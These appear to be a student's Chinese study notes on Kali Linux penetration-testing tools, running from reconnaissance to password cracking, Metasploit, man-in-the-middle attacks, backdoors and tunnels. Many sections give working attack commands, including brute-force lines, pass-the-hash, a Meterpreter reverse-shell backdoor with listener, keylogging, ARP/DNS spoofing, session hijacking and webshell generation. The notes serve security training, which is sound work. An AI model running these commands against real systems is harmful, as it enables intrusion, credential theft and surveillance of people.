# 白帽学院---Kali

## 第一节 安装Kali
1. 就是安装Kali，说别选择配置网络镜像
2. 是否安装到MBR（主引导记录），选择是
3. `cat etc/issue` 查看系统版本
4. 创建一个快照吧，万一坏了

## 第二节 配置Kali
1. 安装VMTools（新版的用一条命令即可 open-vmtools）
2. 系统更新  
   ```
    nano /etc/apt/sources.list  # nano是一个编辑器，你只要能找到这个文件，把有更新源的网址粘进去就可以了，这里推荐了阿里云的源
    另外一些命令：
        apt-get clean  # 清理包缓存
        apt-get update  # 更新软件源列表
        apt-get upgrade  # 升级
        apt-get dist-upgrade  # 升级新的发行版
   ```
3. 设置vpn
   ```
   新建一个sh脚本文件，内容如下：  
    apt-get install network-manager-openvpn-gnome
    apt-get install network-manager-pptp
    apt-get install network-manager-pptp-gnome
    apt-get install network-manager-strongswan
    apt-get install network-manager-vpnc
    apt-get install network-manager-vpnc-gnome
   执行此脚本文件后，还有一条命令
    /etc/init.d/network-manager restart
   ```
4. 安装输入法，google浏览器 自己玩，不管你们
5. 美化主题，这就不用了

## 第三节 安全渗透测试的一般流程  
1. 信息收集：搜索引擎，社工
2. 漏洞分析
3. 漏洞利用：得到权限，提升权限
4. 权限维持：留后门
5. 文档整理分析

## 第四节 信息搜集  
1.搜集信息网站：
   ```
    http://searchdns.netcraft.com/  查看子域名信息
    http://www.shodanhq.com/  Shodan 大数据搜索
    http://www.yougetsignal.com/tools/web-sites-on-web-server/  同IP网站反查
    http://bgp.he.net/  IP信息扫描
    http://builtwith.com/  网站指纹信息
    http://whois.chinaz.com  WHOIS查询
   ```
2. Google Hack语句：  
   ```
    查看基本情况
      info:xx.com    返回一些基本信息
      site:xx.com    返回所有与该网站有关的url
      link:xx.com    返回所有与该站做了链接的网站
      site:xx.com    filetype:txt    查找该网站所有的TXT文件，其他类型以此类推
    查找后台的几种简单语句
      site:xx.com    intext:管理
      site:xx.com    inurl:login
      site:xx/com    intitle:后台
    查找其他信息:
      site:xx.com    intext:*@xx.com  //可以得到邮件地址，邮箱主人名字
      site:xxxx.com    intext:电话        //得到电话信息
      intitle:"index of"    etc           //可能存在的目录泄露信息
    针对性的漏洞利用：
      Powered By XXX
    其他组合方法:http://www.exploit-db.com.google-dorks/
   ```
3. 社交搜索工具：  
    creepy twofi 搜索Twitter等（只有国外，关系不大）  
4. theHarvester信息搜集工具  
    类似还有metagoofil  
5. Recon-ng 信息搜集工具  

## 第五节 信息搜集之目标获取  
DNS, Domain Name System, 域名系统，将域名解析为ip  
1. 使用dig进行域名解析 （windows下 nslookup）  
2.使用dig进行域传送漏洞测试  
   ```
   ①Dig NS DomainName eg：dig NS 163.com
        其中一台DNS服务器为：ns1.nease.net，选择其测试
         dig axfr  @ns1.nease.net  163.com （存在漏洞，则列出该域名所有记录，不存在则失败）
   ②其他工具
       Fierce：fierce -dns 163.com
       Dnsmap：dnsmap 163.com  (可使用指定字典)
       dnsenum：dnsenum 163.com  （速度快，分类明显，可指定字典）
       dnsdict6：dnsdict6 163.com 枚举（实时显示获取二级域名及ip地址）
   ```

## 第六节 信息搜集之主机探测  
判断主机是否在线  
```
1.netenum: 
    netenum 192.168.0.0/24 >test   生成网段列表
    netenum 192.168.0.0/24 3   3秒内有反应则在线（用ping来测试，不太靠谱）
2.fping：fping 192.168.0.0/24     扫描存活主机
3.nbtscan：nbtscan -r 172.16.215.0/24    批量主机名字
4.arping：arping 172.16.215.1    得到对应mac地址
5.netdiscover：netdiscover   被动获取内网信息
6.dmitry：dmitry www.163.com    获取目标详细信息（集成信息，使用谷歌接口）
7.对测试目标进行WAF探测 （WAF：Web Application Firewall，Web应用防护系统）
    wafw00f：wafw00f  www.163.com
8.对目标是否存在负载均衡检测（DDOS）
    LBD（load balancing detector，负载平衡检测器）：lbd  www.163.com
```

## 第七节 信息搜集之主机扫描  
Nmap  
```
nmap ip地址    //扫描1-10000端口，并返回结果
nmap -cc ip地址    //扫描，输出详细过程
nmap -p1-998 ip地址    //扫描指定端口范围
nmap -p80,443,22 ip地址    //扫描指定端口
nmap -sP ip地址    //对目标进行ping扫描（测试是否在线）
nmap --traceroute ip地址    //路由跟踪
nmap -sP 172.16.215.0 /24    //扫描一个C段的主机在线状况
nmap -O ip地址    //操作系统探测
nmap -A ip地址    //万能开关扫描
                  //包含1-10000的端口扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测 时间较长

其他
1.SYN扫描：利用基本的SYN扫描方式探测其端口开放状态
   nmap -sS -T4 ip地址  
2.FIN扫描：可以利用FIN扫描方式探测防火墙状态。FIN扫描方式用于识别端口是否关闭，收到RST回复说明该端口关闭，否则说明是open或被过滤情况
  nmap -sF -T4 ip地址  
3.ACK扫描：利用ACK扫描判断端口是否被过滤。针对ACK探测包，未被过滤的端口（无论打开、关闭）会回复RST包
  nmap -sA -T4 ip地址  
4.扫描前不进行Ping扫描测试
  nmap -Pn ip地址  
5.扫描ip地址列表
  nmap -iL target.txt
6.版本探测扫描：用来扫描目标主机和端口上运行的软件的版本
   nmap -sV ip地址
```

## 第八节 信息搜集之指纹识别
```
1.Banner抓取介绍
    curl -I 网址
    telnet IP地址 端口
2.常规主动指纹识别工具
    nmap -Pn -sT -sV -p80 ip地址
    xprobe2 网址    //对老系统识别较好，现在堪忧
3.被动指纹识别工具
    p0f ：分析NAT、负载均衡、应用代理等（网络分析方面）
    打开此工具，访问浏览器时，此工具会自动提取信息
4.WEB指纹识别工具
    whatweb 网址    
    wpscan -u 网址    //针对WordPress的工具
```

## 第九节 信息搜集之协议分析
针对具体协议分析  
```
1.SMB针对利用工具一览
    acccheck 具体看参数
2.SMTP
3.SNMP
4.SSL协议分析
    sslscan 网址
5.其他工具，自行测试
6.Wireshark，数据包分析必备工具
```

## 第十节 漏洞分析之OpenVAS安装（我的kali安装不了）
综合漏洞扫描器  
```
1.检查安装情况
    openvas-check-setup，然后根据建议执行命令
2.执行openvas-mkcert，可保持默认选项，生成证书
3.更新NVT，执行openvas-nvt-sync，更新插件库等资源
4.执行 openvas-mkcert-client -n om -i 为客户端创建证书
5.以openvasad为例添加用户，命令：openvasad -c add_user -n root -r Admin
    也可以使用openvas-adduser添加用户，添加规则如果对所有主机扫描均允许则选择default accept
6.执行openvassd打开服务，开始加载插件的过程
7.加载完插件，执行 openvasmd -rebuild
8.继续执行 openvas-scapdata-sync 和 openvas-certdata-sync 更新漏洞信息库内容
9.结束openvassd进程，重新启动服务，使用openvas-check-setup检查无误
10.访问本地 https://localhost:9392
```

## 第十一节    漏洞分析之OpenVAS使用
...  

## 第十二节    漏洞分析之扫描工具
```
1. Web扫描工具Golismero
    golismero scan 网址
    缺点：结果过于杂乱

2. 漏洞扫描器Nikto.pl
    网页服务扫描器
    nikto -h ip地址
    Perl nikto.pl -h ip地址 -p 80,88,443    //对多个端口进行扫描命令
    Perl nikto.pl -update    //更新插件和数据库 可能要翻墙

3. Lynis 系统信息搜集整理工具
    对Linux操作系统详细配置等信息进行枚举收集，生成易懂的报告文件。
    lynis --check-all -Q    //使用参数 -Q 避免交互 默认枚举当前系统信息

4. unix-privesc-check 信息收集工具
    使用的时候用这个名字试试就知道了
```

## 第十三节 漏洞分析之WEB爬取
Kali字典链接位置：/usr/share/wordlists  
```
1. apache-users 用户枚举脚本
    apache-users -h 172.16.215.154 -l 指定字典 -p 80 -s 0 -e 403 -t 10
    可能会有误判
2. CutyCapt 网站截图工具
    cutycapt --url=http://www.baidu.com --out=baidu.png
3. Dirb 强大的目录扫描工具
    dirb 网址
4. Dirbuster Kali下的图形化目录扫描器，扫描结果直观
5. Vega kali下的awvs
6. WebSlayer WEB爆破工具 修改头，data的工具
```

## 第十四节 漏洞分析之WEB漏洞扫描（一）
```
1. Cadaver 以命令行格式查看webdav
    cadaver 网址或ip
2.davtest 测试对支持WebDAV的服务器上传文件等
    davtest -url 网址
3. deblaze 针对flash远程调用枚举
4. Fimap 文件包含漏洞利用工具
    fimap -u 链接
    fimap -x 写shell，具体自己看提示
5. Grabber
    具体用法自己看提示
```

## 第十五节 漏洞分析之WEB漏洞扫描（二）
```
1. Joomla Scanner
    类似Wpscan的扫描器，针对特定CMS（Joomla）
   joomla -u 网址    具体可看提示
2. SkipFish
    Skipfish -o /tmp/1.report http://www.163.com
3. Uniscan  WVS：简单易用的WEB漏洞扫描器
    有图形化界面
4. W3AF
    Web应用程序攻击和检查框架
    打开方式：w3af_gui
5.  wapiti
    黑盒方式扫描Web应用
    wapiti 网址 -v 2
6. webshag ：集成调用框架
    调用Nmap，UScan，信息收集，爬虫等功能，简化扫描过程
7. WebSploit
    远程扫描和分析系统漏洞
```

## 第十六节 漏洞分析之数据库评估（一）
```
1. BBQSql
    盲注工具，可自定义参数
2. DBPwAudit 数据库用户名密码枚举工具
    使用参考：
   破解MySql数据库
   #./dbpwaudit.sh -s IP -d mysql(数据库名) -D MySQL（数据库类型） -U username（字典） -P password（字典）
3. HexorBase
    图形化的密码破解与连接工具
4. Jsql Injection
    轻量级安全测试工具，可检测SQL注入漏洞，跨平台，效果有待改善，需要把注入参数放在最后（而且可能需要修改url，比如加个单引号之类的）
5.   MDBTools
    包括MDB-Export，MDB-Dump，mdb-parsecsv，mdb-sql，mdb-tables，具体环境具体使用
6. Oracle Scanner
    针对Oracle
7. SIDGuesser
    针对Oracle的SID进行暴力枚举的工具
8. SqlDICT
    用户名密码枚举工具，通过Wine运行
```

## 第十七节    漏洞分析之数据库评估（二）
```
1. tnscmdl0g
    Allows you to inject commands into Oracle
2. Sqlsus
    最好用的两点：注入获取数据速度快，自动搜索可写目录
    sqlsus -g test.conf    先生成一个配置文件，再用vim修改配置文件
    sqlsus test.conf    启动并测试
    成功即可进行数据库操作
3. Sqlninja
    针对 Microsoft SQL Server 的sql注入工具，侧重于获得一个shell
    需要把注入点写入配置文件使用
4. Sqlmap
    自动化侦测和实施SQL注入攻击以及渗透数据库服务器
```

## 第十八节 漏洞分析之Web应用代理
通过应用代理工具分析数据包，或修改数据包重放，暴力攻击等  
```
1. Burpsuite
    用于攻击Web应用程序的集成平台，默认在8080端口使用代理
2. OwaspZAP
    OWASP Zed Attack Proxy Project 攻击代理
    查找网页应用程序漏洞的综合类渗透测试工具，包含拦截代理、自动处理、被动处理、暴力破解、端口扫描、以及蜘蛛搜索等功能
    为会话类调试工具，调试功能不会发起大量请求，对服务器影响较小
3. Paros
    基于java的web代理程序，可以评估web应用程序的漏洞
4. Proxystrike
5. Vega代理功能
6. Webscarab
```

## 第十九节 漏洞分析之BurpSuite
BurpSuite各功能介绍  
```
Proxy ： 准确分析HTTP消息的结构和内容
spide ：爬行蜘蛛工具，住区目标网站，显示网站的内容、基本结构
Scanner Web ： 执行手动和半自动化的Web应用程序渗透测试
Repeater ：手动重新发送单个HTTP请求
Instruder ：自动实施各种定制攻击，包括资源枚举、数据提取、模糊测试等常见漏洞
Sequencer ：对会话令牌、会话标示或其他随机产生的键值的可预测性进行分析
Decoder ：转化成规范的形式编码数据，或转化成各种形式编码和散列的原始数据
Comparer ：比较两个响应内容的差异
```

## 第二十节 漏洞分析之Fuzz工具
模糊测试  
```
1. Bed.pl
    Bruteforce Exploit Detector ，检查常见的漏洞，如缓冲区溢出、格式串漏洞、整数溢出等
    使用看提示
2. Fuzz_ipv6
    针对IPV6协议
3. Ohrwurm
    对SIP通信的Fuzz
4. PowerFuzzer
    有图形化界面（Burpsuite可代替）
5. Wfuzz
    针对web应用，可进行各种猜解，sql注入，xss漏洞等测试，依赖字典
    比Burpsuite轻量级，高效
6. SFuzz Simple-Fuzzer
7. XSSer
    有图形化界面
    XSSer --gtk    打开图形化界面
```

## 第二十一节 密码攻击之在线攻击工具
```
1. Cewl
    通过爬行网站获取关键信息创建一个密码字典
2. CAT（Cisco-Auditing-Tool）
    扫描Cisco路由器的一般性漏洞：例如默认密码、SNMP community字串、一些老的IOS bug
3. Findmyhash
    在线哈希破解工具，借助在线破解哈希网站的接口制作的工具
    命令：findmyhash MD5 -h hash值
    没有cmd5方便有效...
4. Hydra   
    老牌破解工具（固定一个用户名或密码则小写）
      破解FTP服务：hydra -L user.txt -P pass.txt -F ftp://127.0.0.1:21
      破解SSH服务：hydra -L user.txt -P pass.txt -F ssh://127.0.0.1:22
      破解SMB服务：hydra -L user.txt -P pass.txt -F smb://127.0.0.1
      破解MSSQL账户密码：hydra -L user.txt -P pass.txt -F mssql://127.0.0.1:1433
    如果猜解到用户名密码，则可看到高亮显示，有图形化界面
5. Medusa
    与Hydra类似
    例如：Medusa -h 192.168.235.96 -u root -P /rockyou.txt -M ssh
    如要选择服务只需改变-M后的参数即可
6. NCrack
    具有相似的功能，但突出了RDP（3389）爆破功能
    使用命令: ncrack -vv -U windows.user -P windows.pwd 192.168.1.101:3389 ......
7. Onesixyone
    snmp(simple network monitoring protocol)扫描工具，用于找出设备上的SNMP Community字串，扫描速度非常快
8. Patator
    python编写的多服务破解工具，类似Hydra
    枚举服务用户名密码例子：
    patator ssh_login host=127.0.0.1 user=root password=FILE0 0=pass.txt -x ignore:mesg='Authentication failed.'
9. phrasen | drescher
    多线程支持插件式的密码破解工具，具体看提示或者官方文档
10.THC-PPTP-Bruter
    针对PPTP VPN端点（TCP端口1723）的 暴力破解程序
```

## 第二十二节 密码攻击之离线攻击工具（一）
```
1. Creddump套件
    基于python的哈希抓取工具
    包括 cache-dump、lsadump、pwdump等，具体看提示
2. Chntpw
    用来修改Window SAM 文件实现系统密码修改，也可以在kali作为启动盘是做删除密码的用途
3. Crunch
    密码字典生成工具，可以指定位数生成暴力枚举字典
    举例：crunch 1 3 0876    可生成包含0876的所有三位数组合
4. Dictstat
    字典分析工具，可分析出一个现有字典分布状况，也可按照一定过滤器提取字典
    同一项目下的工具还有 MaskGen PolicyGEn
5. Fcrackzip
    Kali下的一款ZIP压缩包密码破解工具
    具体看提示（-c a 指定小写字母）
6. Hashcat
    系列软件包含Hashcat、oclHashcat、oclRausscrack
    Hashcat只支持cpu破解，后面两个支持gpu加速
7. Hashid
    哈希分析工具，可以判断哈希或哈希文件是何种哈希算法加密的
    使用方法：hashid 哈希值
8. HashIdentifyer
    与HashID类似的工具
9. John the ripper
    用于linux shadow中账户的密码破解，社区版支持MD5-RAW等哈希的破解
    使用方法：
        john shadow文件
        john --h shadow文件    查看结果
10. Johnny
    John的图形化，更易使用与操作
```

## 第二十三节 密码攻击之离线攻击工具（二）
```
1. Ophcrack
    彩虹表Windows密码hash破解工具，对应用命令行版的ophcrack-cli
2. Pyrit
    无线网络密码破解工具，借助GPU加速，提高WPA2密码破解效率
    检查包：pyrit -r xxx.cap analyze
    字典跑包：pyrit -r xxx.cap -i yyy.dic -b ssid attack_passthrough
3. Rcrack
    彩虹表密码哈希工具
    具体见提示（要有足够的彩虹表）
4. Rcracki_mt
    彩虹表密码哈希工具，支持最新格式的彩虹表（彩虹表是关键）
5. Rsmangler
    字典处理工具，可以生成几个字串所有可能组合形式，社工字典等
    使用方法：rsmangler -f 文件
6. Samdump2 与 BKhive
    linux下破解Windows下哈希的工具
    使用过程：
        a. 获取win下的文件
            SAM文件： C:\windows\system32\config\SAM
            system文件： C:\windows\system32\config\system
        b. 用bkhive从system文件生成bootkey文件
            bkhive system bootkey
        c. 用bootkey和SAM文件通过samdump2生成一个密码hash文件
            samdump2 SAM bootkey > hashes
        d. 使用 john 破解
            john hashes
7.SIPCrack
    针对SIP protocol协议数据包的破解工具，支持PCAP数据包与字典破解
    按照提示使用
8. SUCrack
    借助su命令进行本地root账户的密码破解
9. Truecrack
    针对TrueCrypt加密文件的密码破解工具
```

## 第二十四节 密码攻击之哈希传递攻击
Passing the Hash, 直接拿hash来认证  
```
1. Passing the hash 套件
    用PWDUMP7可以抓取windows下的HASH
    使用Pth-winexe 可以借助哈希执行程序得到一个cmdshell：
        pth-winexe -U=username%passwordhash //172.16.215.155 cmd
2. Keimpx
    python编写的哈希传递工具，通过已有的哈希信息GET一个后门SEHLL
    keimpx -t 172.16.215.155 -c ~/hash.txt
    具体使用看提示，有乱码可通过终端选择字符编码
    绑定后门之后，可直接用nc连接
3. Metasploit
    模块exploit/windows/smb/psexec 可完成hash传递攻击
```

## 第二十五节 无线安全分析工具
```
一. RFID/NFC工具
    IC卡的攻击与破解
    无线网络安全团队RADIOWAR的WIKI
二. 软件定义无线电
三. 蓝牙工具集
四. 无线网分析工具
    BackTrack系列，包括Aircrack-ng无线网络分析套件等工具
    1. Aircrack
        与802.11标准的无线网络分析有关的安全软件。
        主要功能：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解
    2. Cowpatty
        WPA-PSK握手包密码破解工具
    3. EAPMD5PASS
        针对EAP-MD5的密码破解工具
    4. 图形化的Fern Wifi Cracker
    5. MDK3
        无线DOS攻击测试工具
        详细请看：http://xiao106347.blog.163.com/blog/static/215992078201425920197/
    6.WiFite
        自动化的无线网审计工具，可完成自动化破解，python脚本编写，结合Aircrack-ng套件与Reaver工具
    7. Reaver
        对开启WPS的路由器PIN码进行破解
        http://blog.csdn.net/tinyeyeser/article/details/17127805
        一两天内一般可成功。。。
```

## 第二十六节 漏洞利用之检索与利用
看不清，不看了...  

## 第二十七节 漏洞利用之Metasploit基础
```
1. 启动服务
    需要先开启PostgreSQL数据库服务和metasploit服务
    service postgresql start
    service metasploit start
    如果不想每次都手动启动服务，可以配置随系统启动
    update-rc.d postgresql enable
    update-rc.d metasploit enable
2.路径介绍
    Kali中msf的路径为 usr/share/metasploit-framework 各模块介绍
      Auxiliary: 辅助模块
      encoders: 供msfencode编码工具使用，具体可以使用 msfencode -l
      exploits：攻击模块
      payloads：攻击载荷，也就是攻击成功后执行的代码
      post：后渗透阶段模块，在获得meterpreter的shell之后可以使用的攻击代码
3. 基本命令
    msfpayload：用来生成 payload 或 shellcode
        搜索时可使用 msfpayload -l | grep "windows"
            -o 可以列出payload所需的参数
    msfencode：
        msf中的编码器，早期为了编码绕过AV（杀毒软件），现常用msfpayload与它编码避免exploit的坏字符串
    msfconsole：
        开启metasploit的console
4. 测试示例 ： 发现漏洞，搜索exploit
    nmap -sV 172.16.215.143
    扫描得知目标21端口vsftpd服务版本为2.3.4，使用msfconsole打开msf的命令行版本。
    输入help查看常用命令
    使用search命令搜索vsftpd查看是否存在相应的漏洞利用exploit
5. 测试示例：选择exploit，查看并设置参数
    use exploit/unix/ftp/vsftpd_234_backdoor
    show options
    set RHOST 172.16.215.143
6. 测试示例：选择payload
    set payload cmd/unix/interact    //可以通过Tab键提示补齐
    show option    //查看是否需要设置参数
7. 测试示例：执行攻击测试
    输入exploit即可进行攻击测试，如果成功，将返回一个shell
```

## 第二十八节 漏洞利用之Meterpreter介绍
```
常用的命令：
    background：将当前会话放置后台
    load/use：加载模块
    Interact：切换进一个信道
    migrate：迁移进程
    run：执行一个已有的模块 输入run后按两下tab，会列出所有的已有的脚本，常用的有
        autoroute，hashdump，arp_scanner，multi_meter_inject等
    Resource：执行一个已有的rc脚本，常用的Metapreter类型为：
        payload/windows/meterpreter/reverse_tcp
        针对Windows操作系统，反向连接shell，使用起来比较稳定

步骤：
1. 生成Meterpreter后门
    命令：
    msfpayload windows/meterpreter/recerse_tcp LHOST=172.16.215.182 LPORT=2333 R | msfencode -t exe -c 5 > /root/door.exe
2. 打开MSF，开启监听
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 172.16.215.182
    set LPORT 2333
    exploit
3. 在目标机器上执行door.exe
    本地得到Meterpreter返回的shell
4. 通过Help命令查看可执行的命令
5. 常见命令使用
    sysinfo    系统信息
    screenshot    抓取屏幕截图
    hashdump    抓取HASH
6. 目录浏览
    pwd
    ls
7.键盘监听
    keyscan_start
    keyscan_dump
    keyscan_stop
8.扩展工具
    load或者use
    load 一个模块名
    help    即可看到模块的详细说明
9. 扩展工具之Mimikatz
    抓取本地密码明文：wdigest
```

## 第二十九节 漏洞利用之Metasploit后渗透测试
```
在跳板机获取一定权限后，需要积极地向内网主机权限发展，获取指定的目标信息，探查系统的漏洞，借助Msf已经得到的Meterpreter后门，可以使系列的操作更容易

1. 查看当前网卡、网段信息
    ifconfig
2. 添加路由表
    run autoroute -s 10.0.0.1
    这是在metasploit中最常用的方法，添加路由表和session的关系后，可以使用msf中的模块跨网段扫描或攻击
3. 开Socks代理
    通过使用auxiliary/server/socks4a 模块，创建一个Socks代理，可以为浏览器，sqlmap，Nmap等使用
    命令：
    background    //把session置于后台
    search socks
    use auxiliary/server/socks4a   //此步之后可以用show option 设置一些参数，也可以保持默认
    exploit
    通过设置浏览器代理即可访问内网计算机
4. 通过Background 和 sessions -i 可以自由切换进入 Session
5. 执行 run 可以看到在Meterpreter上可以执行的很多命令
    run checkvm    //查看是否为虚拟机
6. 通过run post/ 可以看到后渗透测试的模块
7. 获取内网信息
    run arp_scanner -r 10.0.0.1/24    看看是否还有其他主机
8. 上传文件，做端口转发后进行后续测试
    upload /root/lcx.exe c:\    上传文件
    shell    获取shell
    转到上传目录执行程序：lcx.exe
```

## 第三十节 漏洞利用之BeEF
BeEF是浏览器攻击框架的简称，是一款专注于浏览器端的渗透测试工具
```
1. 命令行下启动Beef
    beef-xss
    默认用户名密码：beef
2. 假设被测试主机由于XSS漏洞请求到
    http://192.168.11.152:3000/demos/basic.html
    此时在左侧就会出现一项在线主机，包括很多信息
3. HOOK持续的时间为关闭测试页面为止，在此期间相当于被控制，可以发送攻击命令，在Commands模块可以完成很多任务：
    4种颜色分别表示：
        绿色：该攻击模块可用，且隐蔽性强
        该攻击模块可用，但隐蔽性差
        该用户模块是否可用还待验证
        该攻击模块不可用
4. 例如，选取MISC下的Raw Javascript模块作为测试用例，如果成功，可弹窗
5. Proxy功能
    选中目标主机，点右键，在菜单中选中Use  as  Proxy；
    然后再Rider选项卡中的Forge Request（伪造请求） 编辑发送想要发送的内容
6. 使用Metasploit模块
    修改 /usr/share/bddf-xss/config.yaml中的metasploit一行为true
    修改 /usr/share/bddf-xss/extensions/metasploit/config.yaml 中的callback_host为本机ip地址
        修改 custom 路径为 ：/usr/share/metasploit-framework/
    配置好之后，打开msfconsole,运行命令：
        load msggrpc ServerHost=172.16.215.182（本机地址） Pass=abc123
    转到/usr/share/bddf-xss/目录下，执行命令：./BeeF -x 命令
    service beef-xss restart   即可看到模块
```

## 第三十一节 漏洞利用之SET
Social Engineering Toolkit（SET）：开源、python驱动的社会工程学渗透测试工具，提供非常丰富的攻击向量库，通常结合metasploit使用  
```
一、命令行下输入 setoolkit  打开SET套件
二、菜单选项1是社会工程学攻击，输入1回车后，可看到相应的模块
三、鱼叉式钓鱼攻击
        此攻击向量主要目的为发送存在恶意软件的钓鱼邮件
        相应的Payload可以选择不同的漏洞
四、网站攻击框架
        开放一个WEBServer服务，如对方访问此页面，系统存在漏洞触发条件，则被植入后门
        如Java Applet Attack 方法需要目标有Java运行环境。
        为了仿真，可以选择自建模板或克隆一个网站
五、 介质感染攻击
        借助Autorun.inf执行Exploit得到一个返回的Shell，也可以借助Metasploit的后门
六、创建Payload和监听器
        返回一个Payload并开启监听
        与Metasploit给出的Payload类似
七、群发邮件攻击
        支持导入列表并向列表中的每个人发送邮件
八、基于Arduino的攻击
        针对硬件设备的模块
九、短信欺骗攻击
十、无线接入点攻击
        会创建一个虚拟无线AP，通过接入点ap可以抓取所有连接进来的设备流量
十一、二维码攻击
        填入一个危险的URL，使得被攻击者扫描二维码自动访问页面中招
十二、PowerShell攻击
        针对Vista以上的Powershell的攻击模块
十三、Fast-Track攻击模块
```

## 第三十二节 嗅探欺骗与中间人攻击
ARP欺骗，DNS欺骗，嗅探，会话劫持（cookies）等
```
1. 为kali设置开启端口转发
    echo 1 > /proc/sys/net/ipv4/ip_forword
2. 设置ssltrip
    为劫持SSL数据，需使https数据变为http：
        iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8081
   让ssltrip在8081端口监听：
        ssltrip -l 8081
3. ettercap的准备
    用于中间人攻击，支持插件和过滤脚本，直接将账号密码显示出来
    第一次使用需要配置一下
    打开 /etc/ettercap/etter.conf    
        将ec_uid、ec_gid 改成0
        在linux分类下把 if you use iptables 注释（#号）去掉
4. Ettercap使用
    打开ettercap（命令行下 -G 打开图形化界面）
    选择sniff选项-->unified sniffing-->选择网卡
    host选项  先"scan for hosts"，扫描完之后选"host list"
    把网关安排到target1，想攻击的目标放到tartget2
    mitm选项卡选择"arp poisioning"，start即可
5. Dsniff介绍
    Dsniff套装主要是arpspoof和dsniff，前者用来进行arp欺骗，后者用于嗅探
   进行攻击的步骤如下：
      进行arp欺骗：
        arpspoof  [-i  interface(网卡)]  [-c  own|host|both(欺骗方式，通常是both)] [-t  target(目标)]  [-r]   host(网关)
      进行嗅探：
        dsniff  [-cdmn]  [-i  interface  |  -p  pcapfile]  [-s  snaplen]   [-f  services]  [-t  trigger[,...]]  [-r | -w  savefile]  [expression]

6. 会话劫持
    以cookies举例
       
  开始arp欺骗：arpspoof -i wlan0 -t 192.168.1.1 192.168.1.102
  捕获数据包：tcpdump -i wlan0 -w test.cap
   估计目标登录网站了，开始处理捕获的数据包（。。。）：ferret -r test.cap
   如果捕获的包没有问题，而且开启了端口转发，那么经过处理的数据包会自动生成hamster.txt
    命令行下运行hamster: hamster   (自动提示浏览器设置代理为 http://127.0.0.1:1234)
    在浏览器打开hamster：http://hamster
    选择目标和可能的登录认证地址，点击链接即实现会话劫持
7.图片截获
  利用Driftnet可以看到被攻击者在访问网站的图片
    首先用arpspoof启动arp欺骗（见6）
    然后启动driftnet：driftnet -i
    当目标访问有图片的网站时，就能在弹出的小窗口中看到
8. DNS欺骗
    使用Dsniff套装中的dnsspoof或者ettercap的dnsspoof插件
        首先编辑一个自己的hosts文件，如
            127.0.0.1 www.baidu.com
        保存成hosts，位于/root目录下
    启动dnsspoof：
        dnsspoof -i wlan0 -f /root/hosts
    等待被攻击者访问百度。。
9. URL监控
    Dsniff套装中的urlsnarf工具，对TCP80，,328,8080端口的HTTP通信进行解析，可将嗅探到的所有HTTP请求转存为通用日志格式（Common Log Format，CLF），可很方便地用一些日志分析工具分析记录结果
    Usage：urlsnarf  [-n]  [-i  interface | -p  pcapfile]  [[-v] pattern  [expression]]
10. 下载软件监控
    利用Dsniff套装中的filesnarf工具，可从嗅探到的NFS通信中，选定某个文件，转出到本地当前工作目录
    Usage：filesnarf  [-i  interface | -p pcapfile]  [[-v]  pattern  [expression]]
```

## 第三十三节 权限维持之后门
权限维持包含Tunnel工具集，Web后门，系统后门三类，后门是为方便再次进入系统而留下的恶意程序  
```
1. Weevely
    python编写的webshell工具（webshell生成与连接），linux下菜刀替代工具（限于php）
    生成一个后门：weevely generate test ~/1.php
    将后门上传至WEB，使用weevely连接：weevely http://172.15.164.12/1.php test
2. WeBaCoo（Web Backdoor Cookie）script-kit
    小巧，隐蔽的php后门，提供一个可以远程连接web服务器并执行php代码的终端 ，使用HTTP响应头传送命令结果，shell命令经base64编码后隐藏在Cookie头中
    生成一个webshell：webacoo -g -o backdoor.php
    上传到网站后，使用webacoo连接：webacoo -t -u http://172.16.215.143/backdoor.php
3. Cymothoa（系统后门）
    枚举/bin/bash 进程pid：ps aux | grep "/bin/bash"
        cymothoa -p 10500 -s 0 -y 2333    (注入2333端口)，如果成功，可以连接2333端口，返回一个shell
4. Dbd
    可以当做加密版的nc
    监听端：dbd -l -p 2333 -e /bin/bash -k password
    连接端：dbd 127.0.0.1 2333 -k password
5. Sbd
    与Dbd使用方法类似
6. U3-pwn
    与Metasploit Payload结合使用的工具，针对移动硬件设备（光驱镜像，U盘等）
7. Intersect
    可以自己定制组件（不知道怎么记笔记。。大概就是生成shell，上传连接吧）
```

## 第三十四节 权限维持之Tunnel
Tunnel工具集包含一系列用于建立通信隧道、代理的工具  
```
1. Cryptcat
    建立加密的隧道，netcat的加密版
    使用方法与dbd，sbd类似

2. DNS2TCP
     DNS tunnel  即DNS隧道，利用DNS查询过程建立起隧道，传输数据
    酒店机场等需要输入用户名密码才能继续上网的地方一般使用了透明http代理技术，如果你获取到有效的DNS地址，并且可以进行DNS查询，这时即可使用DNS tunnel技术实现免费上网
     具体过程自己网上搜一下

3. Iodine
    与DNS2TCP类似

4. Miredo
    用于BSD和Linux的IPV6 Teredo隧道连接，可以转换不支持IPV6的网络连接IPV6，内核需要有IPV6和TUN隧道支持

5. Proxychains
    内网渗透测试经常用到的流量转发工具
    如 使用Meterpreter开设一个Socks4a代理服务，通过修改/etc/proxychains.conf配置文件，加入代理，即可使其他工具如sqlmap，nmap直接使用代理扫描内网
        proxychains nmap -sT -Pn 10.0.0.1/24

6. Proxytunnel
    可通过标准的HTTPS代理来连接远程服务器，这是一个代理，实现了桥接的功能。特别用于通过SSH进行HTTP(S)传输
    Proxytunnel可用于：
        使用HTTP(S)代理（HTTP  CONNECT 命令）创建通讯通道
        为OpenSSH写一个客户端驱动，并创建基于SSH连接的HTTP(S) 代理
        作为一个独立的应用，可以连接到远程服务器

7. Ptunnel
    借助ICMP数据包建立隧道通信

8. Pwnat
    内网下通过UDP通信

9. Socat
    可以在不同协议上进行转发数据

10. sslh
    一个ssl/ssh端口复用工具，可以在同一个端口上接受HTTPS，SSH和OpenVPN连接

11. Stunnel

12. Udptunnel

没怎么写笔记的自己百度下用法就好
```

## 第三十五节 逆向工程工具
包括调试器、反编译工具、其他逆向工具集  
```
1.Edb-Debugger
    基于Qt4开发的二进制调试工具，类似OllyDbg，只支持Linux

2. Ollydbg
    经典的Ring3级调试器，动态调试工具，将IDA和SoftICE结合起来的思想。在kali下是wine方式运行的OllyDbg

3. Jad
    java反编译工具

4.Radare2
    可以反汇编、调试、分析、操作二进制文件
    包括rabin2，radiff2，rasm2等工具

5. Recstudio
    反编译工具
    转换windows，linux，mac等可执行文件，以c代码形式展示

6. Apktool
